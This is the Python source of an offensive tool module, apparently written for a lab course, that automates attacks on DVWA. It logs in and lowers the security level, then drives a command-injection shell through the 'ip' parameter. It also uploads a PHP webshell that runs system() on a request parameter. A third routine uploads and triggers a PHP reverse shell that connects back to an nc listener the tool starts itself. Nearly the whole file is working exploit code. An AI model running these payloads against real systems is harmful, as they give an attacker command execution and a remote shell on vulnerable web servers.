# tools/WebRCE/main.py
import os
import re
import socket
import subprocess
import requests

from utils import printcolored, colored, ok, info, warn, fail

class Tool:
    def __init__(self):
        self.name = "WebRCE"

        self.rhost = "http://192.168.107.129"
        self.rport = 80

        self.lhost = self.getlocalip()
        self.lport = 4444

        self.user = "admin"
        self.password = "password"

        self.session = None
        self.loggedin = False

        # DVWA paths
        self.path_login = "/login.php"
        self.path_security = "/security.php"
        self.path_exec = "/vulnerabilities/exec/"
        self.path_upload = "/vulnerabilities/upload/"

    def getlocalip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def _baseurl(self):
        # rhost already includes scheme; rport used only if non-80/443 and not already included
        return self.rhost.rstrip("/")

    def _url(self, path):
        return f"{self._baseurl()}{path}"

    def showoptions(self):
        options = [
            ("RHOST", self.rhost, "yes", "Target DVWA base URL (e.g. http://192.168.1.10)"),
            ("RPORT", str(self.rport), "yes", "Target port (informational unless you include it in RHOST)"),
            ("LHOST", self.lhost, "yes", "Listener IP (your Kali IP)"),
            ("LPORT", str(self.lport), "yes", "Listener port for reverse shell"),
            ("USERNAME", self.user, "yes", "DVWA username"),
            ("PASSWORD", self.password, "yes", "DVWA password"),
        ]

        printcolored("Module options (WebRCE)", "orange")
        header = f"{'Name':<15}{'Current Setting':<30}{'Required':<10}Description"
        printcolored(header, "yellow")
        print("-" * 80)
        for name, value, required, desc in options:
            print(f"{name:<15}{colored(value, 'green'):<30}{colored(required, 'red'):<10}{desc}")

    def showhelp(self):
        printcolored("WebRCE Tool", "yellow")
        print("Commands:")
        print("  show options              - Show current settings")
        print("  set <option> <value>      - Set an option (RHOST, LHOST, LPORT, USERNAME, PASSWORD)")
        print("  run                       - Login + set DVWA security low")
        print("  shell                     - Part 1: interactive command injection shell")
        print("  uploadwebshell            - Part 2: upload PHP webshell (non-reverse) and run whoami/ip a")
        print("  uploadrevshell            - Part 2: upload PHP reverse shell + start nc listener + trigger")
        print("  back                      - Return to framework")

    def handlecommand(self, cmdinput):
        cmd = cmdinput.strip()
        low = cmd.lower()

        if low in ("help", "show options"):
            self.showoptions()
            self.showhelp()
            return

        if low.startswith("set "):
            parts = cmd.split(maxsplit=2)
            if len(parts) < 3:
                fail("Usage: set <option> <value>")
                return
            option = parts[1].upper()
            value = parts[2].strip()

            if option == "RHOST":
                if not value.startswith(("http://", "https://")):
                    value = "http://" + value
                self.rhost = value.rstrip("/")
                ok(f"RHOST => {self.rhost}")
            elif option == "RPORT":
                try:
                    self.rport = int(value)
                    ok(f"RPORT => {self.rport}")
                except ValueError:
                    fail("Invalid port")
            elif option == "LHOST":
                self.lhost = value
                ok(f"LHOST => {self.lhost}")
            elif option == "LPORT":
                try:
                    self.lport = int(value)
                    ok(f"LPORT => {self.lport}")
                except ValueError:
                    fail("Invalid port")
            elif option == "USERNAME":
                self.user = value
                ok(f"USERNAME => {self.user}")
            elif option == "PASSWORD":
                self.password = value
                ok("PASSWORD => (set)")
            else:
                fail(f"Unknown option: {option}")
            return

        if low in ("run", "exploit"):
            self.login()
            return

        if not self.loggedin:
            fail("Not logged in. Type 'run' first.")
            return

        if low == "shell":
            self.interactiveshell()
            return

        if low == "uploadwebshell":
            self.uploadwebshell()
            return

        if low == "uploadrevshell":
            self.uploadrevshell(self.lhost, self.lport)
            return

        if low in ("back", "exit", "quit"):
            info("Returning to Bandito framework...")
            return

        fail(f"Unknown command: {cmd}")
        info("Type 'help' for available commands.")

    def _extract_csrf(self, html):
        # DVWA uses: <input type='hidden' name='user_token' value='...'>
        m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([^'\"]+)['\"]", html, re.I)
        return m.group(1) if m else None

    def login(self):
        if self.loggedin and self.session:
            warn("Already logged in.")
            return

        self.session = requests.Session()

        # Reachability check
        loginurl = self._url(self.path_login)
        info(f"{self._baseurl()} - Checking target reachability")
        try:
            rget = self.session.get(loginurl, timeout=10)
            info(f"{self._baseurl()} - Target reachable (HTTP {rget.status_code})")
        except Exception as e:
            fail(f"{self._baseurl()} - Connection failed: {e}")
            return

        # CSRF token
        info(f"{self._baseurl()} - Fetching login page for CSRF token")
        token = self._extract_csrf(rget.text)
        if not token:
            fail("CSRF token not found on login page")
            return
        ok(f"{self._baseurl()} - CSRF token obtained - Token: {token}")

        # Attempt login
        info(f"{self._baseurl()} - Attempting login")
        logindata = {
            "username": self.user,
            "password": self.password,
            "user_token": token,
            "Login": "Login",
        }

        try:
            rlogin = self.session.post(loginurl, data=logindata, allow_redirects=True, timeout=10)
        except Exception as e:
            fail(f"Login request failed: {e}")
            return

        if "Logout" not in rlogin.text:
            fail("Login failed (no Logout marker). Check credentials / DVWA state.")
            return

        ok(f"{self._baseurl()} - Login successful")

        # Set DVWA security low
        securl = self._url(self.path_security)
        info(f"{self._baseurl()} - Setting security level to Low")
        try:
            self.session.post(securl, data={"security": "low", "seclev_submit": "Submit"}, timeout=10)
        except Exception as e:
            warn(f"Security level POST failed (may still be ok): {e}")

        self.loggedin = True
        ok(f"{self._baseurl()} - Security level set to Low")
        self.showhelp()

    def interactiveshell(self):
        """
        Part 1: interactive command injection shell.
        Sends user commands to DVWA Command Injection (exec) and prints the output.
        """
        execurl = self._url(self.path_exec)
        ok(f"{self._baseurl()} - Using injection endpoint: {execurl}")
        ok(f"{self._baseurl()} - Interactive shell ready. Type 'exit' to quit.")

        while True:
            try:
                cmd = input(colored("webrce> ", "red")).strip()
                if not cmd:
                    continue
                if cmd.lower() in ("exit", "quit"):
                    info("Exiting interactive shell.")
                    break

                # DVWA exec parameter is commonly 'ip' plus 'Submit'
                data = {"ip": f"127.0.0.1; {cmd}", "Submit": "Submit"}

                r = self.session.post(execurl, data=data, timeout=15)

                # Extract output from <pre> blocks if present
                pre = re.findall(r"<pre>(.*?)</pre>", r.text, flags=re.S | re.I)
                if pre:
                    # strip HTML tags inside pre if any
                    out = re.sub(r"<.*?>", "", pre[-1]).strip()
                    print(out)
                else:
                    # fallback: print a trimmed portion
                    warn("Could not parse <pre> output; printing raw response snippet.")
                    print(r.text[:800])

            except KeyboardInterrupt:
                print()
                info("Use 'exit' to leave the shell.")
            except Exception as e:
                fail(f"Shell error: {e}")

    def _write_temp(self, filename, content):
        os.makedirs("/tmp/bandito", exist_ok=True)
        path = f"/tmp/bandito/{filename}"
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        return path

    def uploadwebshell(self):
        """
        Part 2 (first half): upload a simple webshell and run whoami + ip a through it.
        This uses requests (reliable for prof running from GitHub).
        """
        uploadurl = self._url(self.path_upload)
        info(f"{self._baseurl()} - Opening file upload page")
        r = self.session.get(uploadurl, timeout=10)

        token = self._extract_csrf(r.text)
        if not token:
            warn("No CSRF token found on upload page (may be ok depending on DVWA config).")

        shell = "<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>"
        local_path = self._write_temp("webshell.php", shell)

        info(f"{self._baseurl()} - Uploading PHP webshell")
        files = {"uploaded": ("webshell.php", open(local_path, "rb"), "application/x-php")}
        data = {"Upload": "Upload"}
        if token:
            data["user_token"] = token

        r2 = self.session.post(uploadurl, files=files, data=data, timeout=20)
        if r2.status_code != 200:
            fail(f"Upload request returned HTTP {r2.status_code}")
            return
        ok("Upload request completed (HTTP 200)")

        # Common DVWA upload location:
        shell_url = f"{self._baseurl()}/hackable/uploads/webshell.php"
        info(f"Trying webshell at: {shell_url}")

        for c in ("whoami", "ip a"):
            info(f"Running command via webshell: {c}")
            rr = self.session.get(shell_url, params={"cmd": c}, timeout=15)
            print(rr.text.strip()[:2000])

    def uploadrevshell(self, lhost, lport):
        """
        Part 2 (second half): start nc listener in new terminal, upload a reverse shell,
        and trigger it.
        """
        # Start listener in gnome-terminal
        info(f"Starting nc listener on {lhost}:{lport}")
        try:
            subprocess.Popen(["gnome-terminal", "--", "bash", "-lc", f"nc -lvnp {lport}; exec bash"])
            ok("Listener started in new terminal")
        except Exception as e:
            warn(f"Could not open gnome-terminal for nc: {e}")
            warn(f"Run manually: nc -lvnp {lport}")

        uploadurl = self._url(self.path_upload)
        r = self.session.get(uploadurl, timeout=10)
        token = self._extract_csrf(r.text)

        # Simple php reverse shell one-liner (educational / lab)
        rev = (
            "<?php "
            f"$s=fsockopen('{lhost}',{int(lport)});"
            "$p=proc_open('/bin/sh -i', array(0=>$s, 1=>$s, 2=>$s),$pipes);"
            "?>"
        )
        local_path = self._write_temp("revshell.php", rev)

        info("Uploading PHP reverse shell")
        files = {"uploaded": ("revshell.php", open(local_path, "rb"), "application/x-php")}
        data = {"Upload": "Upload"}
        if token:
            data["user_token"] = token

        r2 = self.session.post(uploadurl, files=files, data=data, timeout=20)
        if r2.status_code != 200:
            fail(f"Upload request returned HTTP {r2.status_code}")
            return
        ok("Reverse shell upload completed (HTTP 200)")

        shell_url = f"{self._baseurl()}/hackable/uploads/revshell.php"
        info(f"Triggering reverse shell: {shell_url}")
        try:
            self.session.get(shell_url, timeout=10)
        except Exception:
            # often the request hangs or breaks when shell connects; that's fine
            pass

        ok("If DVWA executed the PHP, your nc terminal should have a shell now.")
